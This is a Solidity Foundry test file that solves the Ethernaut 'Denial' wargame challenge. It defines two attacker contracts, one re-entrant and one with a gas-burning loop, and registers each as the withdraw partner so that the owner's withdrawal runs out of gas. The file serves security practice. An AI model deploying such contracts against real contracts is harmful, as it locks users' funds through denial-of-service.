// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Denial.sol";

// infinite loop
contract MiddleMan {
    receive() external payable {
        Denial(payable(msg.sender)).withdraw();
    }
}

// type(uint256).max > 1m
contract MiddleMan2 {
    receive() external payable {
        for (uint256 i; i < type(uint256).max; i++) {
            i;
        }
    }
}

// since there's a gas limit, make sure the gas is exhausted at the partner.call() line
contract DenialTest is Test {
    // Denial instance = Denial(payable(vm.envAddress("DENIAL")));
    Denial instance;
    uint256 GAS_LIMIT = 1_000_000;

    function setUp() public {
        instance = new Denial();
    }

    function test_infinite_loop() public {
        MiddleMan middleMan = new MiddleMan();
        instance.setWithdrawPartner(address(middleMan));

        uint256 startGas = gasleft();
        vm.prank(instance.owner());
        instance.withdraw();

        assertTrue(startGas - gasleft() > GAS_LIMIT);
    }

    function test_uint256_max() public {
        MiddleMan2 middleMan = new MiddleMan2();
        instance.setWithdrawPartner(address(middleMan));

        uint256 startGas = gasleft();
        vm.prank(instance.owner());
        instance.withdraw();

        assertTrue(startGas - gasleft() > GAS_LIMIT);
    }
}
